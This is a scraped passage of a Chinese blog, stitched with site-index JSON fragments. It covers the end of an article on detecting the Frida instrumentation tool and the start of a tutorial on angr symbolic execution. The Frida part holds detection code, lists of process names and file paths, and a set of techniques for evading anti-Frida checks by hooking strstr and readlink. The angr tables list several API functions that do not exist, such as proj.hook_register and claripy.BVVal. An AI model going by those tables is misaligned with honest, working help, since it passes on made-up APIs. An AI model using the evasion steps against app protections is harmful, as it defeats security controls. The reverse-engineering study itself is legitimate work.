Socket(&quot;127.0.0.1&quot;, 27042); socket.close(); return true; // Detected Frida &#125; catch (IOException e) &#123; // Port not open &#125; return false;&#125; 检测网络流量中的 Frida 特征 监控应用的网络流量，检测是否存在与 Frida 工具相关的流量特征。 例如，检测与 localhost:27042 的连接 检测 D-Bus 协议通信frida 使用 D-Bus 协议通信，这个通信协议并不常见 Frida Server 的通信： 如果 Frida Server 被配置为通过 D-Bus 进行通信，可以检测是否有 Frida Server 在特定的 D-Bus 总线上注册。 D-Bus 信号监听或方法调用 Hook： 检测是否有进程在监听特定的系统服务信号，或者通过 D-Bus 调用敏感接口。 可疑 D-Bus 服务注册： 检测是否有可疑的 D-Bus 服务名或对象路径被注册（与 Frida 的模块或库有关的名称）。 D-Bus 通信流量分析： 检测 D-Bus 通信中是否存在与 Frida 相关的关键字或行为模式。 基于进程和文件的检测检测 Frida 相关的进程Frida 在运行时会启动特定的进程（如 frida-server 或 gadget），这些进程通常可以通过以下方式检测到： Android： 使用 ps 命令或 /proc 文件系统扫描进程列表中是否存在 frida-server 或类似名称的进程。 检测常见的 Frida 进程名称： frida-server gadget libfrida-agent.so frida-helper iOS： 检查是否存在 FridaGadget 或类似的动态库进程。 示例代码（Android）：通过遍历 /proc 文件夹下的所有进程目录（以 PID 为名称的文件夹）并读取每个进程的 cmdline 文件，可以获取当前所有进程的名称。 123456789101112131415161718192021222324252627282930313233343536373839public class FridaDetection &#123; // 检测 Frida 相关进程的存在 public static boolean isFridaProcessDetected() &#123; // 可疑进程列表 String[] suspiciousProcesses = &#123;&quot;frida-server&quot;, &quot;gadget&quot;, &quot;libfrida-agent.so&quot;, &quot;frida-helper&quot;&#125;; // 遍历 /proc 目录 File procDir = new File(&quot;/proc&quot;); File[] files = procDir.listFiles(); if (files == null) &#123; return false; &#125; for (File file : files) &#123; // 进程目录名称通常为 PID（数字） if (file.isDirectory() &amp;&amp; file.getName().matches(&quot;\\\\d+&quot;)) &#123; File cmdlineFile = new File(file, &quot;cmdline&quot;); try (BufferedReader reader = new BufferedReader(new FileReader(cmdlineFile))) &#123; String cmdline = reader.readLine(); if (cmdline != null) &#123; for (String suspicious : suspiciousProcesses) &#123; if (cmdline.contains(suspicious)) &#123; // 如果发现可疑进程，返回 true System.out.println(&quot;Detected Frida process: &quot; + cmdline); return true; &#125; &#125; &#125; &#125; catch (Exception e) &#123; // 忽略无法读取的进程 &#125; &#125; &#125; // 未检测到可疑进程 return false; &#125; 扫描 task 目录在 Linux 和 Android 系统中，每个进程都可以通过 /proc/[pid]/task 目录查看其线程信息。Frida 在注入目标进程时，可能会创建额外的线程用于执行其任务（例如动态注入、代码 Hook 或通信处理）。通过扫描 /proc/[pid]/task 目录下的线程信息，可以检测出与 Frida 相关的特征线程，从而判断 Frida 是否已注入目标进程。 原理： 线程命名特征： Frida 在注入进程后，可能会创建一些具有特定名称的线程（如 gum-js-loop, gum-js-worker 等）。 这些线程名称会暴露在 /proc/[pid]/task/[tid]/comm 文件中（comm 文件记录线程的名称）。 线程数量异常： Frida 注入后，目标进程通常会多出额外的线程。这些线程的数量和行为可能与正常的线程模式不一致。 线程行为异常： Frida 创建的线程可能会执行特定的任务（如动态库加载、代码注入等），这些行为可以通过进一步的分析来发现。 通过扫描 task 目录下的线程的 comm 文件或 status 文件，看是否存在上述字符。 检测 Frida 安装文件Frida 的运行通常需要一些特定的文件或库，可以通过检查文件系统是否存在这些文件来检测其存在： Android 文件路径： /data/local/tmp/frida-server /data/local/tmp/gadget.so /data/local/tmp/libfrida-agent.so /dev/frida iOS 文件路径： /Library/FridaGadget.dylib /usr/sbin/frida-server 检测文件示例（Android）：123456789101112131415private boolean isFridaFilesPresent() &#123; String[] suspiciousFiles = &#123; &quot;/data/local/tmp/frida-server&quot;, &quot;/data/local/tmp/libfrida-agent.so&quot;, &quot;/data/local/tmp/gadget.so&quot;, &quot;/dev/frida&quot; &#125;; for (String file : suspiciousFiles) &#123; File f = new File(file); if (f.exists()) &#123; return true; // Detected Frida files &#125; &#125; return false;&#125; 基于动态库的检测检测已加载的 Frida 动态库在 Linux 和 Android 系统中，/proc/self/maps 文件是一个重要的内存映射文件，它记录了当前进程的内存布局信息，包括加载的动态链接库（.so&#x2F;.dylib 文件）、匿名内存区域、堆栈区域等。 Frida 在目标进程中运行时会加载一些特定的动态库（如 libfrida-agent.so 或 libfrida-gadget.so），这些库会出现在 /proc/self/maps 文件中。因此，通过扫描这个文件，可以有效检测 Frida 是否存在。 原理Frida 在运行时会动态加载一些特定的库，可以通过检查进程的已加载库列表来检测这些库是否存在。 常见的 Frida 库名称： libfrida-gadget.so frida-agent.so libfrida-core.so 检测方法（Android）： 通过 /proc/self/maps 文件： 读取当前进程的内存映射，查找是否有 Frida 的库被加载。 123456789101112131415private boolean isFridaLibraryLoaded() &#123; try &#123; BufferedReader reader = new BufferedReader(new FileReader(&quot;/proc/self/maps&quot;)); String line; while ((line = reader.readLine()) != null) &#123; if (line.contains(&quot;frida&quot;) || line.contains(&quot;gadget&quot;)) &#123; return true; // Detected Frida library &#125; &#125; reader.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return false;&#125; 使用 dlopen 或 dlsym 检测 Frida 库使用动态链接器的 API（ dlopen 或 dlsym）在运行时检查特定的库是否被加载。 动态库检测： 当 Frida 注入目标进程时，会加载其核心动态库（如 libfrida-agent.so 或 libfrida-gadget.so）。 使用 dlopen 可以尝试加载这些动态库，如果它们已经被加载，则不会重复加载，并且会返回一个有效的句柄。 符号解析检测： Frida 的动态库中包含一些特定的符号（如 frida_agent_main、gum_interceptor_attach 等）。 使用 dlsym 可以检查这些符号是否存在，如果存在，则说明 Frida 的库已经被注入。 动态库路径特征： Frida 的动态库通常加载在 /data/local/tmp 或其他可疑路径中，可以通过动态库路径进行进一步验证。 示例（C 代码）：123456789101112&lt;C&gt;#include &lt;dlfcn.h&gt;#include &lt;stdio.h&gt;int detect_frida() &#123; void *handle = dlopen(&quot;libfrida-core.so&quot;, RTLD_LAZY); if (handle) &#123; printf(&quot;Frida detected!\\n&quot;); dlclose(handle); return 1; &#125; return 0;&#125; inlinehook 检测：看雪 inlinehook 检测文章 函数劫持： Frida 使用 gum_interceptor 等组件，通过修改函数的入口点指令，将原始函数的执行流程劫持到 Frida 的 Hook 函数中。 通常，函数入口点的前几条指令（例如 x86 架构下的 jmp 或 call 指令）会被替换为跳转指令，指向 Frida 的代码。 函数指令被修改： 被 Hook 的函数，其入口指令（如 mov, jmp, call）会被替换为跳转到 Frida 插入的代码地址。 例如： 在 x86 架构中，可能是 jmp 0xdeadbeef。 在 ARM 架构中，可能是 b 0x12345678。 内存保护特性： 通常情况下，代码段（如 .text 段）是只读的，如果发现代码段被修改，说明可能存在 Inline Hook。 检查函数入口点的指令是否被修改通过读取目标函数的入口点指令，与正常的函数指令进行对比，判断是否存在被篡改的情况。 我们可以通过检测每个函数的开头是否有 0xd61f020058000050 这样的一段代码来判断进程是否被 frida 附加了。 自定义 Syscall 防 HookFrida 的 Hook 主要发生在用户态函数（如 libc 函数）上，而系统调用（Syscall）是直接由内核处理的，无法直接通过 Frida 在内核级别 Hook。因此，通过直接调用系统调用（而不是通过 libc 等用户态封装的函数）可以绕过 Frida 的 Hook。 自定义系统调用可以直接与内核交互，绕过用户态的 Hook。通过直接调用系统调用，可以检查某些关键函数是否被 Hook，并实现防御。 原理： 直接调用 Syscall： 使用 syscall 指令（Linux x86 和 x86_64 平台）或类似的机制（ARM 上的 svc 指令）直接调用内核的系统调用接口，而不经过 libc 函数。 这样可以绕过用户态的 Hook（如 Frida 对 open、read 等函数的劫持）。 对比检测： 同时调用 libc 函数和 Syscall，并对比返回结果。如果结果不一致，说明用户态函数可能已被 Hook。 例如：调用 open 时，直接使用 syscall 调用内核的 open，并与 libc 的 open 返回值对比。 完整性校验： 通过直接调用系统调用，检查重要内存区域（如 .text 段）的完整性，检测是否存在 Inline Hook 或其他篡改行为。 参考： https://github.com/qtfreet00/AntiFrida%E5%92%8Chttps://github.com/muellerberndt/frida-detection 基于行为分析的检测检测系统调用行为Frida 会劫持系统调用，可以通过监控系统调用行为的异常来检测 Frida。例如： 检测常见函数（如 ptrace, mprotect, malloc 等）的调用频率和调用栈。 检测代码注入行为Frida 的动态注入可能会修改应用进程的代码段，可以通过检测代码段的完整性来判断是否被修改。例如： 验证代码段的哈希值是否与预期一致。 对抗性检测Frida 作为用户层工具，通常依赖于 root 权限或越狱环境，因此可以通过检测设备的运行环境来间接检测 Frida： 检测设备是否 Root（Android）或越狱（iOS）。 检测调试工具的存在，如 gdb 或 lldb。 Frida 的持久双进程守护Frida 双进程守护 是一种对抗检测或增强 Frida 稳定性的方法，通过运行两个相互守护的进程，在一个进程被杀死（如由于检测或防护措施）时，另一个进程会迅速重启被杀的进程，从而保证 Frida 的持续运行。 简单来说，双进程守护是一种 进程自恢复机制，它通过两个进程相互监控，确保目标进程（如 frida-server 或其他注入进程）在受到干扰或被终止时能够重新拉起。 双进程守护的工作原理双进程守护的核心思想是： 启动两个进程（例如，Process A 和 Process B），每个进程都负责监控对方的运行状态。 如果任意一个进程被终止，另一个进程会立即重新启动被终止的进程。 守护进程之间通常通过以下方式监控对方： 进程存在检测：例如，通过定期检查对方的 PID 是否仍然存在。 管道通信：例如，两个进程之间建立一个通信管道（如 pipe 或 socket），如果管道的连接断开，说明对方进程异常退出。 重新拉起被杀死的进程，确保两者始终在运行。 对抗双进程守护的方法虽然双进程守护可以有效增强 Frida 的运行稳定性，但它也并非无法对抗。以下是常见的对抗方法： 批量杀死相关进程： 使用脚本同时杀死两个守护进程。例如，直接通过 pkill 命令杀死所有与 Frida 相关的进程： 1pkill -f frida 进程组杀死： 确保杀死整个进程组，而非单一进程。 检测并删除守护逻辑： 分析守护进程的逻辑，找到其启动点（如脚本文件或守护代码），并删除或禁用它。 资源隔离： 使用沙箱环境隔离进程，阻止 Frida 守护进程相互监控。 frida 常见过检测思路:1.自编译 frida server 魔改一些常见特征，然后过检测，例如 hluda-server 2.通过 hook strstr、strcmp 等系统函数，将一些比较 frida 的情况给 hook 通过 Hook 系统函数（如 strstr、strcmp），拦截对 Frida 特征的检测逻辑。 例如，当检测逻辑使用 strstr(line, &quot;frida&quot;) 时，返回 NULL，使检测代码认为没有发现 Frida。 3.通过 hook readlink 将一些 maps 等文件进行重定向 Hook 系统调用 readlink，当检测逻辑试图访问&#x2F;proc&#x2F;self&#x2F;maps 或&#x2F;proc&#x2F;self&#x2F;exe 等关键文件时，返回伪造的数据。 例如，将 /proc/self/maps 中的 libfrida-agent.so 替换为其他名称。 4.通过 hook so 加载和 pthread 创建，定位 frida 检测线程，然后将线程给 hook 、 Hook 动态库加载函数（如 dlopen），阻止检测逻辑加载特定的动态库。 Hook 线程创建函数（如 pthread_create），定位检测 Frida 的线程，并停止这些线程。 5.通过逆向分析，定位 frida 检测函数，然后 hook Frida","categories":[],"tags":[],"keywords":[]},{"title":"符号执行与angr","slug":"符号执行与angr","date":"2024-12-08T02:20:23.000Z","updated":"2024-12-11T10:31:55.323Z","comments":true,"path":"2024/12/08/符号执行与angr/","link":"","permalink":"http://example.com/2024/12/08/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E4%B8%8Eangr/","excerpt":"","text":"前言距离第一次接触并使用符号执行CTF——angr使用学习记录_ctf angr-CSDN博客已经三年了，现在再回过头来重温一下 符号执行简述 介绍符号执行起初应用于基于源代码的安全检测中，它通过符号表达式来模拟程序的执行，将程序的输出表示成包含这些符号的逻辑或数学表达式，从而进行语义分析。符号执行使用符号值作为输入值，根据程序语义利用符号集对程序变量，表达式和语句进行符号翻译，沿着程序路径执行，通过收集条件送往求解器进行求解，最后的输出值可表示为输入值的符号函数。在遇到状态分支时，相应的分叉探索每支路径状态，收集每支路径上的约束条件，通过约束求解器验证约束条件的可满足性问题。若路径约束可满足，则说明路径可达，并生成测试用例，程序执行到该路径；若约束是不可满足的，则该路径不可达，终止分析。 符号变量: 用符号代替实际值，例如将输入变量 x 设为符号变量。 路径条件（PC）: 执行路径上所有分支条件的逻辑与组合，用于约束符号变量的取值。 约束求解器（Constraint Solver）: 用来求解路径条件，验证路径是否可行，并生成测试输入。如z3 静态符号执行与动态符号执行的对比 特性 静态符号执行 动态符号执行 执行方式 基于代码分析，无需运行程序 结合运行时信息，需执行程序 输入表示 完全使用符号变量 符号变量与具体值相结合 路径覆盖 目标为覆盖所有路径 受初始输入限制，覆盖率依赖动态执行路径 动态行为支持 难以处理（如动态内存、系统调用） 能更好支持动态行为 路径爆炸问题 严重 部分缓解 使用场景 静态漏洞检测、代码验证、开发早期分析 动态测试生成、漏洞挖掘、真实环境分析 工具示例 KLEE、CBMC Angr、Driller、SAGE 挑战主要还面临着以下挑战：探索路径太多——路径爆炸问题，路径条件太难解决——约束求解问题。 程序执行中路径与分支条件的数量呈指数关系，增加分支的数量导致搜索空间会增大，进一步限制了符号执行的性能。因此，采取合适的搜索策略来提高符号执行的覆盖率，以及减少时间开销尤为重要。 约束求解决定着符号执行的效率。约束求解是一种基于数学理论的分析方法，其问题可描述为一个三元组P&#x3D;&lt;V,D,C&gt;形式，V表示变量集合V&#x3D;{v1,v2,⋯,vn}；D表示中元素的值域集合，即变量的取值范围；C表示约束条件。约束求解问题就是变量在值域范围内取值使得约束条件C可满足的，否则，这约束问题是不可满足的。 angr一个强大的二进制分析工具。angr 的原理是通过将二进制程序转换为中间表示后，结合符号执行、路径分析和求解器技术，来模拟程序运行。综合了静态分析的结构化视角和动态分析的实时行为追踪能力，能够高效地应对多种复杂的二进制分析任务。官方文档：angr documentation 从angr_ctf练习api的使用 老模板 1234567891011121314151617181920212223import angrimport claripy #载入文件，auto_load_libs设置为false，大概是启用angr自带的函数定义，避免一些逻辑过于复杂，机器跑不出来。p = angr.Project(&#x27;./test&#x27;,load_options=&#123;&quot;auto_load_libs&quot;:False&#125;)#我们使用claripy这个模块来定义抽象的数据，claripy的BVS函数可以创建一个指定长度的抽象数据#BVS函数要求两个参数，第一个参数为变量名，第二个参数为变量长度。符号化变量；arg = claripy.BVS(‘arg1′, 8)#entry_state()函数接收一个list作为程序的命令行参数并且返回程序入口的状态state = p.factory.entry_state(args=argv)# 表示从标准输入读取一个字节 state.posix.files[0].read_from(1)#创建一个 blank_state 对象，这个对象里面很多东西都是未初始化的，当程序访问未初始化的数据时，会返回一个不受约束的符号量st = p.factory.blank_state(addr=)#表示从state这个地址开始执行。sm = p.factory.simulation_manager(state)#当探索到find地方，就是想要的答案，avoid就是需要避免的地方。sm.explore(find=0x400676,avoid=[0x40073d])#最后的输出sm.found.posix.dumps(1) #found的输入sm.found.posix.dumps(0) #使用约束求解引擎获取命令行参数，类型为字符串，sm.found.solver.eval(arg1,cast_to = str） 在使用符号变量后，不能通过posix.dump来获取标准输入，而应该获取符号变量的值，simgr.one_found.solver.eval函数可以获取符号变量的值 angr.Project API 函数 功能 常见场景 angr.Project(filename) 加载二进制文件，初始化 angr.Project 实例。 启动项目，加载目标二进制文件。 .factory.entry_state() 创建从程序入口点（通常是 _start）开始的初始状态。 启动符号执行，分析程序主逻辑。 .factory.simgr() 创建 SimulationManager，管理和探索符号执行路径。 进行路径探索，寻找满足特定条件的执行路径。 .factory.blank_state() 创建一个空白状态，允许完全自定义内存和寄存器值。 模拟特定状态，分析特定函数或跳过程序初始化。 .factory.call_state(addr, *args) 创建直接跳转到目标函数的状态，同时传递参数。 跳过程序的主逻辑，直接分析特定函数的行为。 .loader 提供访问加载器信息的接口，包括程序段、符号表和地址映射。 分析程序的符号表、段信息或全局变量。 .loader.find_symbol(name) 根据符号名称查找符号对象（如函数或变量）。 定位函数入口点（如 main 或 printf）以供进一步分析。 .analyses.CFGFast() 快速构建控制流图（CFG），适用于大部分静态分析场景。 分析函数边界、基本块、调用关系等。 .analyses.CFGAccurate() 构建更精确的控制流图，结合符号执行以支持复杂逻辑分析。 分析动态分支或复杂的跳转逻辑（耗时较长）。 .kb.functions 提供程序中所有函数的集合，提取的函数信息存储在知识库中。 获取函数的入口点、调用地址及详细信息。 .arch 返回二进制程序的架构信息（如 x86, ARM）。 匹配目标处理器架构，适配指令集和寄存器配置。 .factory.block(addr) 返回指定地址的基本块对象，包含该块的指令信息和控制流。 分析特定地址的基本块逻辑，查看反汇编的指令。 .hook(addr, hook_obj) 在指定地址设置钩子，重定向程序的逻辑到自定义函数或模拟对象。 替换系统调用、模拟函数逻辑或跳过某些程序段。 .unhook(addr) 移除指定地址的钩子，恢复地址的原始逻辑。 取消对程序特定地址的重定向，恢复正常分析流程。 .string(addr, maxlen=100) 从内存中提取指定地址的字符串。 提取程序中的硬编码数据（如密码、路径或消息）。 .factory.state_from_addr(addr) 创建从特定地址开始的执行状态。 手动设置分析起点，避免从入口点（_start）执行整个程序。 SimStateangr.SimState 类是 angr 框架的核心组件之一，表示符号执行过程中的程序状态。它包含寄存器、内存、约束、文件 I&#x2F;O 等信息，能够模拟程序的执行流程，追踪路径上的符号化变量以及相应的约束条件。 API 函数 功能描述 常见场景 state.regs 获取寄存器状态集合，所有寄存器均为符号化位向量（BitVector）。支持通过寄存器名称访问和修改。 查看和操作寄存器值，例如修改栈指针（esp）、读取通用寄存器（如 eax）。 state.regs.&lt;name&gt; 通过指定寄存器名称直接访问对应寄存器的值，例如 state.regs.eax 或 state.regs.esp。 分析和控制寄存器值，影响程序执行路径。 state.mem[addr].type 通过类型化方式访问内存，type 可以是 char, short, int, long 等。 模拟程序对内存的读写操作，提取变量或修改地址值。 state.mem[addr].type.concrete 获取内存中值的具体表示形式（非符号化）。 提取内存中实际存储的数据值，例如常量或硬编码数据。 state.mem[addr].type.resolved 获取内存中值的符号化表示形式（符号化位向量）。 分析程序中符号化变量的状态或约束。 state.memory.load(addr, size) 从指定地址加载内存，返回大小为 size 字节的位向量（BitVector）。 更灵活地获取指定大小的内存数据，适合非标准类型的内存访问。 state.memory.store(addr, bitvector) 将符号化位向量存储到指定内存地址。 模拟写入内存的操作，调整或修改程序的内存状态。 state.posix.dumps(fileno) 获取指定文件描述符（如 stdin, stdout, stderr）上的数据流。 模拟或分析程序的输入输出交互行为，例如提取输入数据或分析输出结果。 state.solver.eval(expr) 求解符号化表达式的值，返回实际值（具体化结果）。 检查寄存器、内存或表达式的符号化解。 state.solver.eval_upto(expr, n) 求解符号化表达式的多个可能值，返回最多 n 个具体值。 检查表达式的多种可能解，用于多路径分析。 state.solver.satisfiable() 判断当前状态是否满足所有符号化约束。 验证路径是否有效或继续符号执行的条件是否成立。 state.globals 自定义全局变量存储区，允许用户将数据存储到状态中以供后续分析使用。 保存和共享分析中提取的额外信息，例如标志位或动态计算结果。 示例：栈的符号化： 1234567891011121314151617181920212223242526272829303132333435363738import angrimport claripyimport sysdef main(argv): p = angr.Project(&#x27;&#x27;) def good(state): return b&#x27;Good Job.&#x27; in state.posix.dumps(1) def bad(state): return b&#x27;Try again.&#x27; in state.posix.dumps(1) #创建开始状态 start_addr = 0x08048697 #scanf之后的地址，之所以是这儿，是因为上一行&#x27;add esp,10h&#x27;的作用是清理scanf的栈空间 state = p.factory.blank_state(addr=start_addr) #因为跳过了scanf函数，所以我们需要模拟它的整个操作(对栈的操作) #state.stack_push(state.regs.ebp) state.regs.ebp = state.regs.esp #初始化ebp、esp space = 0x8 #一个变量占4个空间，所以两个就是8 state.regs.esp -= space #模拟scanf时栈的情况(剔除了对空间的浪费，即只开辟了两个变量的空间) ps1 = claripy.BVS(&#x27;ps1&#x27;,32) #符号化两个输入 ps2 = claripy.BVS(&#x27;ps2&#x27;,32) state.stack_push(ps1) #将符号化的输入入栈 state.stack_push(ps2) #至此对scanf的模拟过程就完成了 #创建模拟管理器 simulation = p.factory.simgr(state) #开始探索 simulation.explore(find=good,avoid=bad) if simulation.found: solution_state = simulation.found[0] flag1 = solution_state.solver.eval(ps1) flag2 = solution_state.solver.eval(ps2) print(&#x27;&#123;&#125; &#123;&#125;&#x27;.format(flag1,flag2)) if __name__ == &#x27;__main__&#x27;: main(sys.argv) SimulationManagerangr.SimulationManager 是 angr 框架中用于管理和操作多个程序执行路径（SimulationState 对象）的核心组件。它提供了一种高层抽象，用于对符号化执行进行路径分类、过滤、探索以及管理，是分析和控制程序路径执行的强大工具。 两种写法等效 12proj.factory.simgr(state)proj.factory.simulation_manager(state) angr.SimulationManager 类中使用率较高的重要 API 函数及其功能的详细表格： API 函数 功能描述 常见场景 simgr.step() 执行符号化状态的单步操作，更新路径组。 模拟逐步执行程序的每条指令或基本块。 simgr.explore(find=addr_or_func, avoid=addr_or_func) 按条件探索路径，找到满足 find 条件且避免 avoid 条件的路径。 搜索特定地址或满足特定条件的路径，常用于解题和漏洞挖掘。 simgr.run() 完成符号执行，直到没有更多路径可以探索（或满足指定的终止条件）。 对程序进行全面探索，用于分析所有可能的执行路径。 simgr.stashes 路径组的存储字典，包含多个分类路径集合（如 active、found、avoid 等）。 检查路径分组情况，提取特定类型的路径以便进一步分析。 simgr.active 当前处于活跃状态的路径集合，表示正在探索的路径。 分析程序当前的执行状态或提取路径。 simgr.found 已经找到满足 find 条件的路径集合（通过 explore 或手动操作生成）。 获取解决问题的路径，例如找到密码或破解条件。 simgr.avoid 已经找到满足 avoid 条件的路径集合（通过 explore 或手动操作生成）。 检查和分析避免的路径，例如危险分支或无解的条件路径。 simgr.move(from_stash, to_stash) 将路径从一个存储分组移动到另一个分组，例如从 active 移动到 found。 管理和分类路径的状态，特别是手动调整路径分组以优化分析流程。 simgr.filter(func, stash=&#39;active&#39;) 按指定条件筛选路径，将符合条件的路径移动到其他分组。 用于路径过滤和重分类，例如将特定地址的路径移动到 found 分组。 simgr.split(func) 按条件对路径进行分组，将每个分组放入单独的存储。 分类路径，例如按程序逻辑分割路径。 simgr.prune() 清除指定存储中的路径，释放不需要的路径以节省内存。 删除不再需要的路径，优化性能或专注于特定分组路径。 simgr.drop(stash) 删除指定分组中的所有路径。 清理无用路径集合，提升符号执行效率。 simgr.use_technique(technique) 应用特定的探索技术（ExplorationTechnique），如深度优先或宽度优先搜索。 定制符号执行策略，优化路径探索过程。 ClaripyClaripy 是 angr 中用于符号化计算和约束求解的关键库，它为符号执行提供了强大的表达式表示、符号求解、符号计算、以及符号约束管理功能。Claripy 处理和操作符号化数据（如变量和内存地址）并提供求解器接口，用于符号计算、约束求解和路径分析。对于我们而言一般不需要直接与其进行交互，但通常我们会使用其提供的一些接口 bitvector - 位向量 位向量（bitvector）是 angr 求解引擎中的一个重要部分，其表示了 一组位 （a sequence of bits）。 以下是优化和扩展后的 Claripy 常用函数和属性表格，增加了详细的描述、常见的使用场景以及新内容： 函数&#x2F;属性 功能描述 示例代码 应用场景 claripy.BVV(value, size) 创建具有具体值的位向量（BitVector Value）。支持整数或字符串作为值，size 指定位宽。 bv = claripy.BVV(10, 32) # 创建一个32位具体值位向量10 表示程序中固定值的变量，例如初始化常量、硬编码地址等。 claripy.BVS(name, size) 创建具有符号值的位向量（BitVector Symbol），name 为符号变量名，size 指定位宽。 sym_bv = claripy.BVS(&#39;x&#39;, 32) # 创建一个32位符号位向量 x 表示程序中未知或可变值的变量，例如输入、环境变量、程序状态。 .concat(*args) 将多个位向量连接成一个更大的位向量。 result = claripy.Concat(bv1, bv2) # 将两个位向量 bv1 和 bv2 连接成一个 组合多个变量或部分数据（如标志位、操作码等）形成一个完整的值。 .zero_extend(bits) 对位向量执行零扩展，将其长度增加指定的 bits 位，用 0 填充扩展部分。 extended_bv = bv.zero_extend(8) # 将 bv 扩展 8 位 统一位宽，适配不同长度变量的运算需求。 .sign_extend(bits) 对位向量执行符号扩展，将其长度增加指定的 bits 位，用符号位填充扩展部分。 extended_bv = bv.sign_extend(8) # 将 bv 符号扩展 8 位 处理带符号运算时的位宽适配。 .op 获取位向量表达式的操作类型（如 Add、Sub 等运算符）。 operation = sym_bv.op # 返回 sym_bv 的运算类型 分析复杂表达式结构，理解操作类型。 .args 获取位向量表达式的参数（子表达式或值）。 arguments = sym_bv.args # 返回 sym_bv 的操作数 获取表达式的子结构，用于符号执行中的表达式简化和优化。 claripy.If(cond, true_val, false_val) 条件表达式，返回当条件为真或假时的不同值。 result = claripy.If(flag == 1, sym_bv1, sym_bv2) 表示程序中的条件分支逻辑，例如条件跳转和选择性赋值。 .extract(high_bit, low_bit) 提取位向量中的某些位。 extracted = bv.extract(15, 8) # 提取 bv 的第 8 至 15 位 解析复杂数据格式，如拆解操作码、提取标志位。 .reverse() 反转位向量的字节顺序。 reversed_bv = bv.reverse() # 将 bv 的字节顺序反转 处理不同字节序的兼容性问题，例如大端与小端的转换。 .length 获取位向量的长度（位宽）。 length = bv.length 检查变量的大小是否符合预期，用于程序状态分析。 .simplify() 对符号表达式进行简化，尝试减少表达式的复杂度。 simplified_expr = sym_expr.simplify() 优化复杂表达式，提高符号执行效率。 .is_symbolic() 检查位向量是否为符号变量（返回 True）或具体值（返回 False）。 is_sym = sym_bv.is_symbolic() 判断变量属性，确定其是否需要约束求解。 .resolved 获取位向量的具体值（BVV），当符号变量已被约束求解时可用。 concrete_val = sym_expr.resolved 将符号变量的求解结果转换为具体值。 .concrete 获取位向量的具体值（int 类型），仅适用于具体值位向量。 value = bv.concrete 检查和操作具体值，例如验证程序中常量的正确性。 Claripy ，涵盖了符号表达式的符号计算、符号约束和求解等关键操作。 函数 功能描述 示例代码 claripy.Bool(name) 创建一个符号布尔表达式，用于表示符号化的布尔值。 b = claripy.Bool(&#39;b&#39;) # 创建一个符号布尔变量 b claripy.If(cond, true_expr, false_expr) 根据条件 cond 返回 true_expr 或 false_expr，类似于三元运算符。 result = claripy.If(x == 1, y + 10, y - 10) # 如果 x &#x3D;&#x3D; 1, 返回 y + 10，否则返回 y - 10 claripy.And(expr1, expr2) 对两个符号表达式进行按位与（AND）运算。 result = claripy.And(x, y) # 对 x 和 y 执行按位与运算 claripy.Or(expr1, expr2) 对两个符号表达式进行按位或（OR）运算。 result = claripy.Or(x, y) # 对 x 和 y 执行按位或运算 claripy.Xor(expr1, expr2) 对两个符号表达式进行按位异或（XOR）运算。 result = claripy.Xor(x, y) # 对 x 和 y 执行按位异或运算 claripy.Not(expr) 对符号表达式执行按位取反（NOT）运算。 result = claripy.Not(x) # 对 x 执行按位取反运算 claripy.Concat(expr1, expr2) 连接两个符号表达式，形成一个新的符号表达式。 result = claripy.Concat(x, y) # 将 x 和 y 拼接在一起 claripy.LShR(expr, n) 对符号表达式 expr 进行逻辑右移运算。 result = claripy.LShR(x, 4) # 对 x 进行逻辑右移4位 claripy.Shl(expr, n) 对符号表达式 expr 进行逻辑左移运算。 result = claripy.Shl(x, 4) # 对 x 进行逻辑左移4位 claripy.BVVal(value, size) 创建一个具有固定值和大小的符号位向量（常量值）。 value = claripy.BVVal(5, 32) # 创建一个32位的符号常量值 5 claripy.symbolic() 将一个给定值标记为符号化值。返回符号值，表示该值在符号执行中需要被处理。 symbol = claripy.symbolic(val) # 将 val 标记为符号值 claripy.eval_upto(expr, n) 返回符号表达式的多个解，最多返回 n 个解。 solver.eval_upto(x + y, 5) # 求解 x + y 的5个解 claripy.solver.Solver() 创建一个符号求解器实例，用于对符号表达式求解。 solver = claripy.solver.Solver() # 创建一个符号求解器实例 solver.add(expr) 向符号求解器中添加一个符号约束。 solver.add(x == 10) # 添加约束 x == 10 solver.eval(expr) 求解符号表达式，返回其具体值（求解后的整数值）。 solver.eval(x + y) # 求解 x + y 的值 solver.satisfiable() 检查当前符号约束是否可满足，若可满足返回 True，否则返回 False。 solver.satisfiable() # 检查当前约束是否可满足 solver.unsat_core() 返回符号求解器中无法满足的最小约束集（unsat core）。 solver.unsat_core() # 返回最小不可满足约束集 claripy.strlen(expr) 返回一个符号字符串表达式的长度。 length = claripy.strlen(some_str) # 获取符号字符串 some_str 的长度 claripy.strtoint(expr, base) 将符号字符串转换为整数，base 为进制（如 10 表示十进制）。 num = claripy.strtoint(some_str, 10) # 将符号字符串转换为整数 hook在 angr 中，hook 允许用户为程序的特定地址或函数提供自定义的处理逻辑。通过 hook，用户可以拦截程序的控制流，并用自定义的代码替代原有的函数或指令。 常用 hook 函数表格 API 函数 功能描述 示例代码 常见场景 proj.hook(addr, hook_func) 将给定地址的原始指令替换为 hook_func 函数的逻辑。 def hook_func(state): state.regs.eax = 42 # 设置 eax 寄存器的值为 42 proj.hook(0x400080, hook_func) 在符号执行时，替换特定地址的指令，实现对程序行为的模拟。 proj.hook_symbol(symbol_name, hook_func) 将给定符号（如函数名）对应的代码替换为 hook_func 函数的逻辑。 def hook_func(state): state.regs.eax = 42 # 设置 eax 寄存器的值为 42 proj.hook_symbol(&#39;target_func&#39;, hook_func) 在符号执行时，替换函数的实现，用于模拟函数调用。 proj.hook_at_addr(addr, hook_func) 绑定在特定地址上，执行 hook 操作。 proj.hook_at_addr(0x400080, hook_func) 通过地址钩住程序，模拟执行特定的内存位置的代码或替换其逻辑。 proj.hook_call(addr, hook_func) 钩住在调用特定地址时触发的操作。 proj.hook_call(0x400080, hook_func) 用于模拟对某些函数或操作的调用，替代原本的调用过程。 proj.hook_register(register_name, hook_func) 为寄存器创建钩子函数，替代特定寄存器的操作。 proj.hook_register(&#39;eax&#39;, hook_func) 替代对寄存器的操作，模拟寄存器值的更新。 hook_func(state) 用户定义的钩子函数，接收一个 state 参数并返回新的状态或修改当前状态。 def hook_func(state): state.regs.eax = 42 # 设置 eax 寄存器的值为 42 用户定义的钩子函数，用于修改符号执行时的状态，如设置寄存器的值、修改内存等。 示例： 123p.hook(addr=0x08048485, hook=hook_demo, length=2)p.hook_symbol(&#x27;想要被hook的函数名&#x27;, 自己定义的替换函数名，replace=True） addr 为待 hook 指令的地址 hook 为 hook 的处理函数，在执行到 addr 